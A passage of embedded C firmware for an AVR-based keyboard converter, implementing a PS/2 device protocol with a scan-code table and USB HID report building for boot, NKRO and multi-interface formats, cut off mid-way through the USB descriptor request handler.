static uint8_t  g_ps2Pullups = 0;
static uint32_t g_usbLostAt = 0;

static uint8_t  ps2_enabled = 1;
static uint8_t  ps2_leds = 0;
static uint8_t  ps2_arg = PS2_ARG_NONE;
static uint8_t  ps2_set = 2;
static uint8_t  ps2_lastTx = 0;
static uint8_t  ps2_lastCmd = 0;
static uint8_t  ps2_busy = 0;
static uint32_t ps2_sent = 0;
static uint32_t ps2_cmds = 0;
static uint32_t ps2_aborts = 0;
static uint32_t ps2_dropped = 0;
static uint32_t ps2_framing = 0;

static uint8_t  ps2_pullups = 1;
static uint32_t ps2_resends = 0;

static uint8_t ps2_prev[KB_REPORT_LEN];
static uint8_t ps2_txBuf[PS2_TX_SIZE];
static uint8_t ps2_txHead = 0;
static uint8_t ps2_txTail = 0;
static uint8_t ps2_rspBuf[PS2_RSP_SIZE];
static uint8_t ps2_rspHead = 0;
static uint8_t ps2_rspTail = 0;

static const uint8_t PROGMEM PS2_MODS[8] = {
  0x14, 0x12, 0x11, 0x1F, 0x14, 0x59, 0x11, 0x27
};

static const uint8_t PROGMEM PS2_SET2[0x68] = {
  [0x04] = 0x1C, [0x05] = 0x32, [0x06] = 0x21, [0x07] = 0x23,
  [0x08] = 0x24, [0x09] = 0x2B, [0x0A] = 0x34, [0x0B] = 0x33,
  [0x0C] = 0x43, [0x0D] = 0x3B, [0x0E] = 0x42, [0x0F] = 0x4B,
  [0x10] = 0x3A, [0x11] = 0x31, [0x12] = 0x44, [0x13] = 0x4D,
  [0x14] = 0x15, [0x15] = 0x2D, [0x16] = 0x1B, [0x17] = 0x2C,
  [0x18] = 0x3C, [0x19] = 0x2A, [0x1A] = 0x1D, [0x1B] = 0x22,
  [0x1C] = 0x35, [0x1D] = 0x1A,
  [0x1E] = 0x16, [0x1F] = 0x1E, [0x20] = 0x26, [0x21] = 0x25,
  [0x22] = 0x2E, [0x23] = 0x36, [0x24] = 0x3D, [0x25] = 0x3E,
  [0x26] = 0x46, [0x27] = 0x45,
  [0x28] = 0x5A, [0x29] = 0x76, [0x2A] = 0x66, [0x2B] = 0x0D,
  [0x2C] = 0x29, [0x2D] = 0x4E, [0x2E] = 0x55, [0x2F] = 0x54,
  [0x30] = 0x5B, [0x31] = 0x5D, [0x32] = 0x5D, [0x33] = 0x4C,
  [0x34] = 0x52, [0x35] = 0x0E, [0x36] = 0x41, [0x37] = 0x49,
  [0x38] = 0x4A, [0x39] = 0x58,
  [0x3A] = 0x05, [0x3B] = 0x06, [0x3C] = 0x04, [0x3D] = 0x0C,
  [0x3E] = 0x03, [0x3F] = 0x0B, [0x40] = 0x83, [0x41] = 0x0A,
  [0x42] = 0x01, [0x43] = 0x09, [0x44] = 0x78, [0x45] = 0x07,
  [0x47] = 0x7E,
  [0x49] = 0x70, [0x4A] = 0x6C, [0x4B] = 0x7D, [0x4C] = 0x71,
  [0x4D] = 0x69, [0x4E] = 0x7A, [0x4F] = 0x74, [0x50] = 0x6B,
  [0x51] = 0x72, [0x52] = 0x75,
  [0x53] = 0x77, [0x54] = 0x4A, [0x55] = 0x7C, [0x56] = 0x7B,
  [0x57] = 0x79, [0x58] = 0x5A,
  [0x59] = 0x69, [0x5A] = 0x72, [0x5B] = 0x7A, [0x5C] = 0x6B,
  [0x5D] = 0x73, [0x5E] = 0x74, [0x5F] = 0x6C, [0x60] = 0x75,
  [0x61] = 0x7D, [0x62] = 0x70, [0x63] = 0x71,
  [0x64] = 0x61, [0x65] = 0x2F, [0x66] = 0x37, [0x67] = 0x0F
};

static void ps2_clk_low(void) {
  PS2_CLK_PORT &= (uint8_t)~(1 << PS2_CLK_BIT);
  PS2_CLK_DDR |= (uint8_t)(1 << PS2_CLK_BIT);
}

static void ps2_clk_release(void) {
  PS2_CLK_DDR &= (uint8_t)~(1 << PS2_CLK_BIT);
  if (ps2_pullups) PS2_CLK_PORT |= (uint8_t)(1 << PS2_CLK_BIT);
  else PS2_CLK_PORT &= (uint8_t)~(1 << PS2_CLK_BIT);
}

static void ps2_dat_low(void) {
  PS2_DAT_PORT &= (uint8_t)~(1 << PS2_DAT_BIT);
  PS2_DAT_DDR |= (uint8_t)(1 << PS2_DAT_BIT);
}

static void ps2_dat_release(void) {
  PS2_DAT_DDR &= (uint8_t)~(1 << PS2_DAT_BIT);
  if (ps2_pullups) PS2_DAT_PORT |= (uint8_t)(1 << PS2_DAT_BIT);
  else PS2_DAT_PORT &= (uint8_t)~(1 << PS2_DAT_BIT);
}

static uint8_t ps2_clk(void) { return (uint8_t)((PS2_CLK_PIN & (1 << PS2_CLK_BIT)) ? 1 : 0); }
static uint8_t ps2_dat(void) { return (uint8_t)((PS2_DAT_PIN & (1 << PS2_DAT_BIT)) ? 1 : 0); }

static void ps2_lines_idle(void) { ps2_clk_release(); ps2_dat_release(); }

static void ps2_pins_init(void) {
  DIDR2 &= (uint8_t)~(1 << ADC10D);
  ps2_lines_idle();
}

static uint8_t ps2_line_pulled(volatile uint8_t *ddrp, volatile uint8_t *portp,
                               volatile uint8_t *pinp, uint8_t bit) {
  uint8_t ddr = (uint8_t)(*ddrp & (1 << bit));
  uint8_t port = (uint8_t)(*portp & (1 << bit));

  *portp &= (uint8_t)~(1 << bit);
  *ddrp |= (uint8_t)(1 << bit);
  _delay_us(60);
  *ddrp &= (uint8_t)~(1 << bit);
  _delay_us(20);
  uint8_t level = (uint8_t)((*pinp & (1 << bit)) ? 1 : 0);

  if (ddr) *ddrp |= (uint8_t)(1 << bit);
  else *ddrp &= (uint8_t)~(1 << bit);
  if (port) *portp |= (uint8_t)(1 << bit);
  else *portp &= (uint8_t)~(1 << bit);
  return level;
}

static uint8_t ps2_host_pullups(void) {
  uint8_t c = ps2_line_pulled(&PS2_CLK_DDR, &PS2_CLK_PORT, &PS2_CLK_PIN, PS2_CLK_BIT);
  uint8_t d = ps2_line_pulled(&PS2_DAT_DDR, &PS2_DAT_PORT, &PS2_DAT_PIN, PS2_DAT_BIT);
  return (uint8_t)(c && d);
}

static void ps2_set_pullups(uint8_t on) {
  ps2_pullups = on;
  if (!(PS2_CLK_DDR & (1 << PS2_CLK_BIT))) ps2_clk_release();
  if (!(PS2_DAT_DDR & (1 << PS2_DAT_BIT))) ps2_dat_release();
}

static uint8_t ps2_tx_bit(uint8_t bit) {
  if (bit) ps2_dat_release();
  else ps2_dat_low();
  _delay_us(PS2_T_SETUP_US);
  if (!ps2_clk()) return 0;

  ps2_clk_low();
  _delay_us(PS2_T_LOW_US);
  ps2_clk_release();
  _delay_us(PS2_T_HIGH_US);
  return 1;
}

static uint8_t ps2_send_byte(uint8_t b) {
  if (!ps2_clk() || !ps2_dat()) return 0;
  for (uint8_t i = 0; i < 5; i++) {
    _delay_us(10);
    if (!ps2_clk() || !ps2_dat()) return 0;
  }

  uint8_t sreg = SREG;
  cli();

  uint8_t parity = 1;
  if (!ps2_tx_bit(0)) goto aborted;
  for (uint8_t i = 0; i < 8; i++) {
    uint8_t bit = (uint8_t)((b >> i) & 1);
    parity ^= bit;
    if (!ps2_tx_bit(bit)) goto aborted;
  }
  if (!ps2_tx_bit(parity)) goto aborted;
  if (!ps2_tx_bit(1)) goto aborted;

  ps2_lines_idle();
  SREG = sreg;
  _delay_us(PS2_T_BYTE_US);
  ps2_lastTx = b;
  ps2_sent++;
  return 1;

aborted:
  ps2_lines_idle();
  SREG = sreg;
  ps2_aborts++;
  return 0;
}

static uint8_t ps2_rx_bit(void) {
  ps2_clk_low();
  _delay_us(PS2_T_LOW_US);
  ps2_clk_release();
  _delay_us(PS2_T_SAMPLE_US);
  uint8_t bit = ps2_dat();
  _delay_us(PS2_T_HIGH_US - PS2_T_SAMPLE_US);
  return bit;
}

static uint8_t ps2_recv_byte(uint8_t *out) {
  uint16_t guard = 0;
  while (ps2_dat()) {
    _delay_us(10);
    wdt_reset();
    if (++guard > 2000) { ps2_lines_idle(); return 0; }
  }
  guard = 0;
  while (!ps2_clk()) {
    _delay_us(10);
    wdt_reset();
    if (++guard > 2000) { ps2_lines_idle(); return 0; }
  }

  uint8_t sreg = SREG;
  cli();

  uint8_t v = 0;
  uint8_t parity = 1;
  for (uint8_t i = 0; i < 8; i++) {
    uint8_t bit = ps2_rx_bit();
    v = (uint8_t)(v | (uint8_t)(bit << i));
    parity ^= bit;
  }
  uint8_t got = ps2_rx_bit();
  uint8_t stop = ps2_rx_bit();

  ps2_dat_low();
  _delay_us(PS2_T_SETUP_US);
  ps2_clk_low();
  _delay_us(PS2_T_LOW_US);
  ps2_clk_release();
  _delay_us(PS2_T_SETUP_US);
  ps2_dat_release();

  SREG = sreg;
  _delay_us(PS2_T_BYTE_US);

  if (got != parity || stop == 0) { ps2_framing++; return 0; }
  *out = v;
  return 1;
}

static void ps2_tx_clear(void) { ps2_txTail = ps2_txHead; }

static void ps2_queue(uint8_t b) {
  uint8_t next = (uint8_t)((ps2_txHead + 1) & PS2_TX_MASK);
  if (next == ps2_txTail) { ps2_dropped++; return; }
  ps2_txBuf[ps2_txHead] = b;
  ps2_txHead = next;
}

static void ps2_reply(uint8_t b) {
  uint8_t next = (uint8_t)((ps2_rspHead + 1) & PS2_RSP_MASK);
  if (next == ps2_rspTail) { ps2_dropped++; return; }
  ps2_rspBuf[ps2_rspHead] = b;
  ps2_rspHead = next;
}

static void ps2_handle_cmd(uint8_t b) {
  ps2_cmds++;

  if (ps2_arg != PS2_ARG_NONE) {
    uint8_t what = ps2_arg;
    ps2_arg = PS2_ARG_NONE;
    ps2_reply(PS2_ACK);
    if (what == PS2_ARG_LEDS) {
      ps2_leds = (uint8_t)(b & 0x07);
      hid_leds = (uint8_t)(((ps2_leds & PS2_LED_CAPS) ? KB_LED_CAPS : 0) |
                           ((ps2_leds & PS2_LED_NUM) ? HID_LED_NUM : 0) |
                           ((ps2_leds & PS2_LED_SCROLL) ? HID_LED_SCROLL : 0));
    } else if (what == PS2_ARG_SET) {
      if (b == 0) ps2_reply(ps2_set);
      else if (b >= 1 && b <= 3) ps2_set = b;
    }
    return;
  }

  ps2_lastCmd = b;
  switch (b) {
    case 0xFF:
      ps2_tx_clear();
      ps2_rspTail = ps2_rspHead;
      ps2_arg = PS2_ARG_NONE;
      ps2_enabled = 1;
      ps2_set = 2;
      ps2_leds = 0;
      hid_leds = 0;
      memset(ps2_prev, 0, sizeof(ps2_prev));
      memset(kb_report, 0, sizeof(kb_report));
      ps2_reply(PS2_ACK);
      ps2_reply(PS2_BAT_OK);
      break;
    case 0xFE:
      ps2_resends++;
      ps2_reply(ps2_lastTx);
      break;
    case 0xEE:
      ps2_reply(PS2_ECHO_RSP);
      break;
    case 0xED:
      ps2_arg = PS2_ARG_LEDS;
      ps2_reply(PS2_ACK);
      break;
    case 0xF0:
      ps2_arg = PS2_ARG_SET;
      ps2_reply(PS2_ACK);
      break;
    case 0xF3:
      ps2_arg = PS2_ARG_ANY;
      ps2_reply(PS2_ACK);
      break;
    case 0xF2:
      ps2_reply(PS2_ACK);
      ps2_reply(0xAB);
      ps2_reply(0x83);
      break;
    case 0xF4:
      ps2_tx_clear();
      memset(ps2_prev, 0, sizeof(ps2_prev));
      ps2_enabled = 1;
      ps2_reply(PS2_ACK);
      break;
    case 0xF5:
      ps2_enabled = 0;
      ps2_tx_clear();
      memset(ps2_prev, 0, sizeof(ps2_prev));
      memset(kb_report, 0, sizeof(kb_report));
      ps2_reply(PS2_ACK);
      break;
    case 0xF6:
      ps2_tx_clear();
      memset(ps2_prev, 0, sizeof(ps2_prev));
      ps2_enabled = 1;
      ps2_reply(PS2_ACK);
      break;
    case 0xF7: case 0xF8: case 0xF9: case 0xFA:
    case 0xFB: case 0xFC: case 0xFD:
      ps2_reply(PS2_ACK);
      break;
    default:
      ps2_reply(PS2_ERR_RSP);
      break;
  }
}

static void ps2_receive(void) {
  uint8_t cmd;
  if (ps2_recv_byte(&cmd)) ps2_handle_cmd(cmd);
  else { ps2_lines_idle(); ps2_reply(PS2_ERR_RSP); }
}

static void ps2_pump(void) {
  if (g_mode != MODE_PS2 || ps2_busy) return;
  ps2_busy = 1;

  if (!ps2_clk()) {
    uint16_t guard = 0;
    while (!ps2_clk() && ps2_dat()) {
      _delay_us(10);
      wdt_reset();
      if (++guard > 300) { ps2_busy = 0; return; }
    }
    if (!ps2_dat()) {
      guard = 0;
      while (!ps2_clk()) {
        _delay_us(10);
        wdt_reset();
        if (++guard > 2000) { ps2_lines_idle(); ps2_busy = 0; return; }
      }
      ps2_receive();
    }
    ps2_busy = 0;
    return;
  }

  if (!ps2_dat()) {
    ps2_receive();
    ps2_busy = 0;
    return;
  }

  if (ps2_rspHead != ps2_rspTail) {
    if (ps2_send_byte(ps2_rspBuf[ps2_rspTail]))
      ps2_rspTail = (uint8_t)((ps2_rspTail + 1) & PS2_RSP_MASK);
    ps2_busy = 0;
    return;
  }

  if (ps2_txHead != ps2_txTail) {
    if (ps2_send_byte(ps2_txBuf[ps2_txTail]))
      ps2_txTail = (uint8_t)((ps2_txTail + 1) & PS2_TX_MASK);
  }
  ps2_busy = 0;
}

static uint8_t ps2_pending(void) {
  return (uint8_t)((ps2_txHead != ps2_txTail) || (ps2_rspHead != ps2_rspTail));
}

static void ps2_drain(uint16_t maxMs) {
  uint32_t start = millis();
  uint8_t stuck = 0;
  while (ps2_pending()) {
    uint32_t before = ps2_sent;
    ps2_pump();
    wdt_reset();
    if (ps2_sent == before) { if (++stuck > 8) return; }
    else stuck = 0;
    if ((uint32_t)(millis() - start) >= maxMs) return;
  }
}

static uint8_t ps2_is_ext(uint8_t usage) {
  switch (usage) {
    case 0x49: case 0x4A: case 0x4B: case 0x4C: case 0x4D: case 0x4E:
    case 0x4F: case 0x50: case 0x51: case 0x52:
    case 0x54: case 0x58: case 0x65: case 0x66:
    case 0xE3: case 0xE4: case 0xE6: case 0xE7:
      return 1;
    default:
      return 0;
  }
}

static uint8_t ps2_code(uint8_t usage) {
  if (usage >= 0xE0 && usage <= 0xE7) return pgm_read_byte(&PS2_MODS[usage - 0xE0]);
  if (usage < sizeof(PS2_SET2)) return pgm_read_byte(&PS2_SET2[usage]);
  return 0;
}

static void ps2_emit(uint8_t usage, uint8_t down) {
  if (!ps2_enabled) return;

  if (usage == KEY_PRINTSCREEN) {
    if (down) {
      ps2_queue(0xE0); ps2_queue(0x12); ps2_queue(0xE0); ps2_queue(0x7C);
    } else {
      ps2_queue(0xE0); ps2_queue(0xF0); ps2_queue(0x7C);
      ps2_queue(0xE0); ps2_queue(0xF0); ps2_queue(0x12);
    }
    return;
  }
  if (usage == KEY_PAUSE) {
    if (!down) return;
    ps2_queue(0xE1); ps2_queue(0x14); ps2_queue(0x77);
    ps2_queue(0xE1); ps2_queue(0xF0); ps2_queue(0x14); ps2_queue(0xF0); ps2_queue(0x77);
    return;
  }

  uint8_t code = ps2_code(usage);
  if (code == 0) return;
  if (ps2_is_ext(usage)) ps2_queue(0xE0);
  if (!down) ps2_queue(0xF0);
  ps2_queue(code);
}

static uint8_t ps2_held(const uint8_t *report, uint8_t usage) {
  for (uint8_t i = 2; i < 2 + KB_ROLLOVER; i++) if (report[i] == usage) return 1;
  return 0;
}

static void ps2_report_diff(void) {
  uint8_t oldMods = ps2_prev[0];
  uint8_t newMods = kb_report[0];

  for (uint8_t i = 0; i < 8; i++) {
    uint8_t m = (uint8_t)(1u << i);
    if ((newMods & m) && !(oldMods & m)) ps2_emit((uint8_t)(0xE0 + i), 1);
  }
  for (uint8_t i = 2; i < 2 + KB_ROLLOVER; i++) {
    uint8_t u = kb_report[i];
    if (u && !ps2_held(ps2_prev, u)) ps2_emit(u, 1);
  }
  for (uint8_t i = 2; i < 2 + KB_ROLLOVER; i++) {
    uint8_t u = ps2_prev[i];
    if (u && !ps2_held(kb_report, u)) ps2_emit(u, 0);
  }
  for (uint8_t i = 0; i < 8; i++) {
    uint8_t m = (uint8_t)(1u << i);
    if (!(newMods & m) && (oldMods & m)) ps2_emit((uint8_t)(0xE0 + i), 0);
  }

  memcpy(ps2_prev, kb_report, KB_REPORT_LEN);
  ps2_drain(60);
}

static void usb_init(void) {
  UHWCON |= (1 << UVREGE);
  USBCON = (1 << USBE) | (1 << FRZCLK);
  PLLCSR = (1 << PINDIV) | (1 << PLLE);
  while (!(PLLCSR & (1 << PLOCK))) { }
  USBCON = (1 << USBE) | (1 << OTGPADE);

  UDCON |= (1 << DETACH);
  if (g_lowSpeed) UDCON |= (1 << LSM);
  else UDCON &= (uint8_t)~(1 << LSM);
  _delay_us(200);
  UDCON &= (uint8_t)~((1 << RSTCPU) | (1 << RMWKUP) | (1 << DETACH));
  usb_configuration = 0;

  UENUM = 0;
  UECONX = (1 << EPEN);
  UECFG0X = 0;
#if EP0_SIZE == 8
  UECFG1X = (0 << EPSIZE0) | (1 << ALLOC);
#elif EP0_SIZE == 16
  UECFG1X = (1 << EPSIZE0) | (1 << ALLOC);
#elif EP0_SIZE == 32
  UECFG1X = (2 << EPSIZE0) | (1 << ALLOC);
#else
  UECFG1X = (3 << EPSIZE0) | (1 << ALLOC);
#endif
  UEIENX = (1 << RXSTPE);

  UDINT &= (uint8_t)~((1 << WAKEUPI) | (1 << SUSPI) | (1 << EORSTI));
  UDIEN = (1 << EORSTE) | (1 << SOFE) | (1 << SUSPE);
}

static void usb_detach(void) { UDCON |= (1 << DETACH); }

static uint8_t usb_ready(void) { return usb_configuration && !usb_suspended; }

/* Build the current interrupt-IN report into buf, return its length. Report protocol
   with NKRO selected emits the 16-byte bitmap report; boot protocol and 6KRO emit the
   8-byte boot layout. A boot-capable interface must always send the boot layout while
   boot protocol is selected, whatever the report-protocol format is. */
/* Build interrupt-IN report `which` (0, or 0/1 for the two 6-key reports of format 4).
   Boot protocol always uses the fixed 8-byte layout with no report ID. */
static uint8_t build_input_report(uint8_t *buf, uint8_t which) {
  if (hid_protocol == 0) {
    for (uint8_t i = 0; i < KB_REPORT_LEN; i++) buf[i] = kb_report[i];
    return KB_REPORT_LEN;
  }
  switch (g_cfg.kro) {
    case KRO_NKRO:
      buf[0] = kb_report[0];
      for (uint8_t i = 0; i < NKRO_BYTES; i++) buf[1 + i] = nkro_map[i];
      return NKRO_REPORT_LEN;
    case KRO_ARRAY: {
      buf[0] = kb_report[0]; buf[1] = 0;
      uint8_t n = fill_array(buf + 2, ARRAY_KEYS);
      while (n < ARRAY_KEYS) buf[2 + n++] = 0;
      return (uint8_t)(2 + ARRAY_KEYS);
    }
    case KRO_MULTI: {
      uint8_t all[ARRAY_KEYS];
      uint8_t total = fill_array(all, ARRAY_KEYS);
      buf[0] = (uint8_t)(KID_KBD + which);
      buf[1] = kb_report[0]; buf[2] = 0;
      for (uint8_t s = 0; s < 6; s++) {
        uint8_t idx = (uint8_t)(which * 6 + s);
        buf[3 + s] = (idx < total) ? all[idx] : 0;
      }
      return 9;
    }
    case KRO_HYBRID:
      buf[0] = KID_NKRO; buf[1] = kb_report[0];
      for (uint8_t i = 0; i < NKRO_BYTES; i++) buf[2 + i] = nkro_map[i];
      return (uint8_t)(2 + NKRO_BYTES);
    case KRO_CONSUMER:
      buf[0] = KID_KBD; buf[1] = kb_report[0]; buf[2] = 0;
      for (uint8_t i = 0; i < KB_ROLLOVER; i++) buf[3 + i] = kb_report[2 + i];
      return 9;
    default:
      for (uint8_t i = 0; i < KB_REPORT_LEN; i++) buf[i] = kb_report[i];
      return KB_REPORT_LEN;
  }
}

/* Write one report to interrupt IN endpoint `ep`, waiting at most `maxiter` * 50us for the
   bank to free. Returns 0 on timeout (report dropped). A large maxiter blocks until the host
   polls (reliable single-endpoint path); a small one is best-effort (secondary endpoint). */
static uint8_t ep_write(uint8_t ep, const uint8_t *buf, uint8_t n, uint16_t maxiter) {
  uint8_t sreg = SREG;
  cli();
  uint8_t saved = UENUM;
  UENUM = ep;
  uint16_t guard = 0;
  while (!(UEINTX & (1 << RWAL))) {
    UENUM = saved;
    SREG = sreg;
    if (!usb_configuration || ++guard > maxiter) { g_reportsFail++; return 0; }
    _delay_us(50);
    sreg = SREG;
    cli();
    saved = UENUM;
    UENUM = ep;
  }
  for (uint8_t i = 0; i < n; i++) UEDATX = buf[i];
  UEINTX = 0x3A;
  UENUM = saved;
  SREG = sreg;
  return 1;
}

/* Send a Consumer Control report (report ID KID_CONS, one 16-bit usage). Only meaningful in
   the consumer format under report protocol. usage 0 releases. */
static void consumer_send(uint16_t usage) {
  if (g_mode != MODE_USB || !usb_configuration || hid_protocol == 0) return;
  uint8_t b[3];
  if (g_cfg.kro == KRO_CONSUMER) {          /* report ID + 16-bit usage on EP1 */
    b[0] = KID_CONS;
    b[1] = (uint8_t)(usage & 0xFF);
    b[2] = (uint8_t)(usage >> 8);
    ep_write(1, b, 3, 8000);
  } else if (g_cfg.kro == KRO_LSCONS) {     /* 16-bit usage, no ID, on IF1 EP2 */
    b[0] = (uint8_t)(usage & 0xFF);
    b[1] = (uint8_t)(usage >> 8);
    ep_write(2, b, 2, 2000);
  } else {
    return;
  }
  g_consumer = usage;
}

static uint8_t kb_flush(void) {
  if (g_mode == MODE_PS2) { ps2_report_diff(); g_reportsOk++; return 1; }
  if (!usb_configuration) { g_reportsFail++; return 0; }
  uint8_t buf[REPORT_MAX];
  uint8_t ok = 1;
  if (fmt_two_if()) {
    if (g_cfg.kro == KRO_HYBRID2) {
      /* Keys ride IF1 (EP2, NKRO) in report protocol so the host does not see them twice;
         boot protocol uses the boot layout on IF0. Bounded writes never stall typing. */
      if (hid_protocol == 0) {
        for (uint8_t i = 0; i < KB_REPORT_LEN; i++) buf[i] = kb_report[i];
        ok = ep_write(1, buf, KB_REPORT_LEN, 8000);
      } else {
        buf[0] = kb_report[0];
        for (uint8_t i = 0; i < NKRO_BYTES; i++) buf[1 + i] = nkro_map[i];
        ok = ep_write(2, buf, NKRO_REPORT_LEN, 200);
      }
    } else if (g_cfg.kro == KRO_LSMULTI) {
      /* Two 6-key boot interfaces: keys 0..5 on IF0 (EP1), 6..11 on IF1 (EP2), no report IDs.
         The modifier byte rides both so a shifted key on either interface stays shifted. */
      uint8_t all[ARRAY_KEYS];
      uint8_t total = fill_array(all, ARRAY_KEYS);
      buf[0] = kb_report[0]; buf[1] = 0;
      for (uint8_t s = 0; s < 6; s++) buf[2 + s] = (s < total) ? all[s] : 0;
      if (!ep_write(1, buf, 8, 600)) ok = 0;
      buf[0] = kb_report[0]; buf[1] = 0;
      for (uint8_t s = 0; s < 6; s++) { uint8_t idx = (uint8_t)(6 + s); buf[2 + s] = (idx < total) ? all[idx] : 0; }
      if (!ep_write(2, buf, 8, 600)) ok = 0;
    } else {
      /* KRO_LSCONS: keyboard on IF0 (EP1); the consumer report (IF1, EP2) is sent on demand. */
      for (uint8_t i = 0; i < KB_REPORT_LEN; i++) buf[i] = kb_report[i];
      ok = ep_write(1, buf, KB_REPORT_LEN, 600);
    }
    if (ok) g_reportsOk++;
    return ok;
  }
  uint8_t reports = (uint8_t)((hid_protocol == 1 && g_cfg.kro == KRO_MULTI) ? MULTI_IDS : 1);
  for (uint8_t r = 0; r < reports; r++) {
    uint8_t n = build_input_report(buf, r);
    if (!ep_write(1, buf, n, 8000)) { ok = 0; break; }
  }
  if (ok) g_reportsOk++;
  return ok;
}

static void kb_press_mods(uint8_t bits) { kb_report[0] |= bits; kb_flush(); }
static void kb_release_mods(uint8_t bits) { kb_report[0] &= (uint8_t)~bits; kb_flush(); }

static uint8_t kb_press(uint8_t usage) {
  if (usage == 0) return 1;
  if (usage >= 0xE0 && usage <= 0xE7) { kb_press_mods((uint8_t)(1u << (usage - 0xE0))); return 1; }
  if (usage <= NKRO_USAGE_MAX) nkro_map[usage >> 3] |= (uint8_t)(1u << (usage & 7));
  for (uint8_t i = 2; i < 2 + KB_ROLLOVER; i++) if (kb_report[i] == usage) { kb_flush(); return 1; }
  for (uint8_t i = 2; i < 2 + KB_ROLLOVER; i++) if (kb_report[i] == 0) { kb_report[i] = usage; kb_flush(); return 1; }
  /* Boot 6-slot array full. Every format except the pure 6-key ones (boot, consumer, lsconsumer)
     still carries the key in the bitmap / second interface, so the press succeeded there. */
  kb_flush();
  if (g_cfg.kro == KRO_BOOT || g_cfg.kro == KRO_CONSUMER || g_cfg.kro == KRO_LSCONS) return 0;
  return (uint8_t)(usage <= NKRO_USAGE_MAX);
}

static void kb_release(uint8_t usage) {
  if (usage == 0) return;
  if (usage >= 0xE0 && usage <= 0xE7) { kb_release_mods((uint8_t)(1u << (usage - 0xE0))); return; }
  if (usage <= NKRO_USAGE_MAX) nkro_map[usage >> 3] &= (uint8_t)~(1u << (usage & 7));
  for (uint8_t i = 2; i < 2 + KB_ROLLOVER; i++) if (kb_report[i] == usage) kb_report[i] = 0;
  kb_flush();
}

static void kb_release_all(void) { memset(kb_report, 0, sizeof(kb_report)); memset(nkro_map, 0, sizeof(nkro_map)); kb_flush(); }

ISR(USB_GEN_vect) {
  uint8_t udint = UDINT;
  UDINT = 0;
  dbg_udint_seen |= udint;

  if (udint & (1 << EORSTI)) {
    dbg_resets++;
    UENUM = 0;
    UECONX = (1 << EPEN);
    UECFG0X = 0;
#if EP0_SIZE == 8
    UECFG1X = (0 << EPSIZE0) | (1 << ALLOC);
#elif EP0_SIZE == 16
    UECFG1X = (1 << EPSIZE0) | (1 << ALLOC);
#elif EP0_SIZE == 32
    UECFG1X = (2 << EPSIZE0) | (1 << ALLOC);
#else
    UECFG1X = (3 << EPSIZE0) | (1 << ALLOC);
#endif
    UEIENX = (1 << RXSTPE);
    usb_configuration = 0;
    usb_suspended = 0;
  }
  if (udint & (1 << SOFI)) {
    if (dbg_sof < 0xFFFF) dbg_sof++;
  }
  if (udint & (1 << SUSPI)) {
    usb_suspended = 1;
    dbg_suspends++;
  }
  if (udint & (1 << WAKEUPI)) {
    usb_suspended = 0;
    dbg_wakeups++;
  }
}

static void ep0_stall(void) {
  dbg_stalls++;
  UECONX = (1 << STALLRQ) | (1 << EPEN);
}

static void ep0_send_pgm(const uint8_t *addr, uint16_t len) {
  uint8_t i, n;
  do {
    do { i = UEINTX; } while (!(i & ((1 << TXINI) | (1 << RXOUTI))));
    if (i & (1 << RXOUTI)) return;
    n = (len < EP0_SIZE) ? (uint8_t)len : EP0_SIZE;
    for (i = n; i; i--) UEDATX = pgm_read_byte(addr++);
    len -= n;
    UEINTX = (uint8_t)~(1 << TXINI);
  } while (len || n == EP0_SIZE);
}

static void ep0_send_ram(const uint8_t *addr, uint16_t len) {
  uint8_t i, n;
  do {
    do { i = UEINTX; } while (!(i & ((1 << TXINI) | (1 << RXOUTI))));
    if (i & (1 << RXOUTI)) return;
    n = (len < EP0_SIZE) ? (uint8_t)len : EP0_SIZE;
    for (i = n; i; i--) UEDATX = *addr++;
    len -= n;
    UEINTX = (uint8_t)~(1 << TXINI);
  } while (len || n == EP0_SIZE);
}

ISR(USB_COM_vect) {
  uint8_t bmRequestType, bRequest;
  uint16_t wValue, wIndex, wLength;

  UENUM = 0;
  if (!(UEINTX & (1 << RXSTPI))) return;

  bmRequestType = UEDATX;
  bRequest = UEDATX;
  wValue = UEDATX;
  wValue |= (uint16_t)UEDATX << 8;
  wIndex = UEDATX;
  wIndex |= (uint16_t)UEDATX << 8;
  wLength = UEDATX;
  wLength |= (uint16_t)UEDATX << 8;
  UEINTX = (uint8_t)~((1 << RXSTPI) | (1 << RXOUTI) | (1 << TXINI));

  dbg_setups++;
  dbg_last_req = bRequest;
  dbg_last_reqtype = bmRequestType;

  if (bRequest == 6) {
    dbg_getdesc++;
    dbg_last_desc = (uint8_t)(wValue >> 8);
    uint8_t type = (uint8_t)(wValue >> 8);
    uint8_t idx = (uint8_t)(wValue & 0xFF);

    if (fmt_two_if()) {
      if (type == 2) {
        uint8_t cfg2[CONFIG2_LEN];
        memcpy_P(cfg2, twoif_config(), CONFIG2_LEN);
        cfg2[33] = poll_bInterval();   /* IF0 EP1 bInterval */
        cfg2[58] = poll_bInterval();   /* IF1 EP2 bInterval */
        uint16_t len2 = CONFIG2_LEN;
        if (len2 > wLength) len2 = wLength;
        ep0_send_ram(cfg2, len2);
        return;
      }
      if (type == 1) {
        uint8_t dd[18];
        memcpy_P(dd, device_descriptor, 18);
        dd[10] = (uint8_t)(USB_PID_COMPOSITE & 0xFF);   /* non-Arduino PID -> generic HID binding */
        dd[11] = (uint8_t)(USB_PID_COMPOSITE >> 8);
        uint16_t l = 18;
        if (l > wLength) l = wLength;
        ep0_send_ram(dd, l);
        return;
      }
      const uint8_t *addr = 0;
      uint16_t len = 0;
      if (type == 0x21) { addr = twoif_config() + ((wIndex == 1) ? CONFIG2_HID1_OFF : CONFIG2_HID0_OFF); len = 9; }
      else if (type == 0x22) { addr = twoif_rdesc((uint8_t)(wIndex == 1 ? 1 : 0), &len); }
#if USB_USE_STRINGS
      else if (type == 3) {
        if (idx == 0) { addr = string0; len = sizeof(string0); }
        else if (idx == 1) { addr = string1; len = sizeof(string1); }
        else if (idx == 2) { addr = string2; len = sizeof(string2); }
      }
#endif
      if (addr == 0) { ep0_stall(); return; }
      if (len > wLength) len = wLength;
      ep0_send_pgm(addr, len);
      return;
    }

    uint16_t rdlen;
    const uint8_t *rd = fmt_rdesc(&rdlen);

    /* Config and HID descriptors carry the report-descriptor length and the EP1 packet
       size, both of which depend on the current mode. Patch a RAM copy and send that. */
    if (type == 2 || type == 0x21) {
      uint8_t cfg[CONFIG_DESC_LEN];
      memcpy_P(cfg, config_descriptor, CONFIG_DESC_LEN);
      cfg[25] = (uint8_t)(rdlen & 0xFF);
      cfg[26] = (uint8_t)(rdlen >> 8);
      cfg[31] = fmt_ep1_size();
      cfg[33] = poll_bInterval();
      const uint8_t *addr = (type == 2) ? cfg : (cfg + 18);
      uint16_t len = (type == 2) ? CONFIG_DESC_LEN : 9;
